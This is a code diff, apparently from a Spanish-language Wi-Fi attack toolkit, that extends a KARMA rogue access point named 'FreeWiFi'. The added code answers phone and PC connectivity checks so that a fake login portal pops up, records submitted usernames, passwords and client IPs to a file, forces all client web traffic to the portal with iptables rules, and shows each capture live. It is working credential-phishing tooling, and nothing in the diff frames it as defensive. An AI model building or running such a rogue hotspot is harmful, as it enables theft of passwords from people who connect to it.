@@ -3715,9 +3715,8 @@ channel={channel}
 macaddr_acl=0
 ignore_broadcast_ssid=0
 ap_isolate=0
-# KARMA: responder a todos los probe requests
-# Requiere hostapd-karma o hostapd con parche KARMA
-# En Kali/Parrot con hostapd estándar, mdk4 mode p es alternativa
+auth_algs=1
+wpa=0
 """)
 
     # dnsmasq
@@ -3758,33 +3757,62 @@ color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;font-weig
         f.write(f"""#!/usr/bin/env python3
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
-import datetime
+import datetime, os
 
-CREDS = "{creds_file}"
-HTML  = "{portal}"
+CREDS   = "{creds_file}"
+HTML    = "{portal}"
+PORTAL  = "http://192.168.20.1/"
+
+# URLs used by OS captive portal detection
+_DETECT = {{
+    "/generate_204",           # Android
+    "/gen_204",                # Android alt
+    "/hotspot-detect.html",    # iOS / macOS
+    "/library/test/success.html",  # iOS alt
+    "/ncsi.txt",               # Windows
+    "/connecttest.txt",        # Windows 10+
+    "/redirect",               # Windows
+    "/success.txt",            # Firefox
+}}
 
 class H(BaseHTTPRequestHandler):
     def log_message(self, *a): pass
-    def do_GET(self):
-        with open(HTML,"rb") as f: b=f.read()
-        self.send_response(200)
-        self.send_header("Content-type","text/html; charset=utf-8")
-        self.end_headers(); self.wfile.write(b)
-    def do_POST(self):
-        l=int(self.headers.get("Content-Length",0))
-        body=self.rfile.read(l).decode()
-        p=parse_qs(body)
-        user=p.get("user",[""])[0]; pwd=p.get("pass",[""])[0]
-        ts=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        ip=self.client_address[0]
-        line=f"[{{ts}}] IP={{ip}} USER={{user}} PASS={{pwd}}"
-        print(f"\\n\\033[1;32m[★ KARMA CAPTURE ★]\\033[0m {{line}}")
-        with open(CREDS,"a") as cf: cf.write(line+"\\n")
-        self.send_response(200); self.send_header("Content-type","text/html; charset=utf-8")
-        self.end_headers()
-        self.wfile.write(b"<html><body style='text-align:center;padding-top:80px;font-family:Arial'><h2>&#10003; Conectado</h2><p>Redirigiendo...</p><script>setTimeout(()=>location.href='https://google.com',2500)</script></body></html>")
 
-HTTPServer(("192.168.20.1",80),H).serve_forever()
+    def do_GET(self):
+        p = self.path.split("?")[0]
+        if p in _DETECT:
+            # Redirect to portal — triggers captive portal popup on devices
+            self.send_response(302)
+            self.send_header("Location", PORTAL)
+            self.end_headers()
+            return
+        with open(HTML, "rb") as fh:
+            b = fh.read()
+        self.send_response(200)
+        self.send_header("Content-type", "text/html; charset=utf-8")
+        self.end_headers()
+        self.wfile.write(b)
+
+    def do_POST(self):
+        l    = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(l).decode(errors="replace")
+        q    = parse_qs(body)
+        user = q.get("user", [""])[0]
+        pwd  = q.get("pass", [""])[0]
+        ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        ip   = self.client_address[0]
+        line = f"[{{ts}}] IP={{ip}} USER={{user}} PASS={{pwd}}"
+        with open(CREDS, "a") as cf:
+            cf.write(line + "\\n")
+        self.send_response(200)
+        self.send_header("Content-type", "text/html; charset=utf-8")
+        self.end_headers()
+        self.wfile.write(b"<html><body style='text-align:center;padding-top:80px;font-family:Arial'>"
+                         b"<h2>&#10003; Conectado</h2><p>Redirigiendo...</p>"
+                         b"<script>setTimeout(()=>location.href='https://google.com',2500)</script>"
+                         b"</body></html>")
+
+HTTPServer(("0.0.0.0", 80), H).serve_forever()
 """)
 
     # ── Preparar interfaz: managed mode, matar conflictos ────────────────────
@@ -3827,6 +3855,10 @@ HTTPServer(("192.168.20.1",80),H).serve_forever()
         run(f"ip addr flush dev {iface_ap} 2>/dev/null")
         run(f"ip addr add 192.168.20.1/24 dev {iface_ap} 2>/dev/null")
 
+        # Redirigir TODO el tráfico HTTP/HTTPS de clientes al portal
+        run(f"iptables -t nat -A PREROUTING -i {iface_ap} -p tcp --dport 80  -j DNAT --to-destination 192.168.20.1:80 2>/dev/null")
+        run(f"iptables -t nat -A PREROUTING -i {iface_ap} -p tcp --dport 443 -j DNAT --to-destination 192.168.20.1:80 2>/dev/null")
+
         ok(f"AP '{WHITE}FreeWiFi{END}' activo en canal {channel}")
         ok(f"Responde a cualquier dispositivo que busque WiFi")
         ok(f"Portal cautivo: http://192.168.20.1")
@@ -3837,12 +3869,30 @@ HTTPServer(("192.168.20.1",80),H).serve_forever()
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1)
 
-        subprocess.run(["python3", server_script], stdin=subprocess.DEVNULL)
+        _srv = subprocess.Popen(["python3", server_script],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        _prev_lines = 0
+        while True:
+            time.sleep(2)
+            if os.path.exists(creds_file):
+                with open(creds_file) as _cf:
+                    _lines = _cf.readlines()
+                if len(_lines) > _prev_lines:
+                    for _l in _lines[_prev_lines:]:
+                        print(f"\n{GREEN}[★ KARMA CAPTURE ★]{END} {_l.rstrip()}")
+                    _prev_lines = len(_lines)
 
     except KeyboardInterrupt:
         pass
     finally:
-        run("pkill -f hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null")
+        try:
+            _srv.terminate()
+        except Exception:
+            pass
+        run("pkill -f 'server.py' 2>/dev/null; pkill -f hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null")
+        run(f"iptables -t nat -D PREROUTING -i {iface_ap} -p tcp --dport 80  -j DNAT --to-destination 192.168.20.1:80 2>/dev/null")
+        run(f"iptables -t nat -D PREROUTING -i {iface_ap} -p tcp --dport 443 -j DNAT --to-destination 192.168.20.1:80 2>/dev/null")
         if iface_net:
             run(f"iptables -t nat -D POSTROUTING -o {iface_net} -j MASQUERADE 2>/dev/null")
         ok("KARMA detenido.")
